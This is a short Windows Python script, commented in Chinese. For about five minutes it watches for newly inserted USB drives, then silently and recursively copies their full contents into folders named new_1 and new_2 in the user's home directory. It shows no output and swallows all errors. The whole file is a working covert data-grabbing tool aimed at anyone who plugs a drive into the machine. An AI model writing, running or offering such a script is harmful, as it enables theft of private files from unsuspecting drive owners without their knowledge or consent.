import os
import string
from time import sleep as s_p

def get_path():
	'''得到目标路径'''
	change_name = os.path.expanduser('~')
	full_name_1 = r"%s\new_1" %(change_name)
	full_name_2 = r"%s\new_2" %(change_name)
	return full_name_1, full_name_2

def my_copy(aim_path, now_path):
	'''复制U盘内容到电脑指定位置'''
	try:
		files = os.listdir(now_path)
		for file in files:
			new_path = os.path.join(now_path, file)
			if os.path.isdir(new_path):
				first_path = os.path.join(aim_path, file)
				os.mkdir(first_path)
				my_copy(first_path, new_path)
			elif os.path.isfile(new_path):
				last_path = os.path.join(aim_path, file)
				with open(new_path, 'rb') as r_b:
					temp = r_b.read()
				with open(last_path, 'wb') as w_b:
					w_b.write(temp)
	except Exception:
		pass

def get_disklist():
	'''获得计算机所有盘符'''
	disk_list = []
	for c in string.ascii_uppercase:
		disk = c + ':'
		if os.path.isdir(disk):
			disk_list.append(disk)
	return disk_list, disk_list[-1], disk_list[-2]


def main():
	"""主程序"""
	time = 0 
	a = get_path()
	aims = get_disklist()
	now_digit = len(aims[0])
	while 1:
		aims = get_disklist()
		time += 1
		if time > 100:
			break
		s_p(3)
		new_digit = len(aims[0])
		if now_digit + 1 == new_digit:
			os.mkdir(a[0])
			my_copy(a[0], aims[1])
			break
		elif now_digit + 2 == new_digit:
			os.mkdir(a[0])
			my_copy(a[0], aims[1])
			os.mkdir(a[1])
			my_copy(a[1], aims[2])
			break

if __name__ == '__main__':
	main()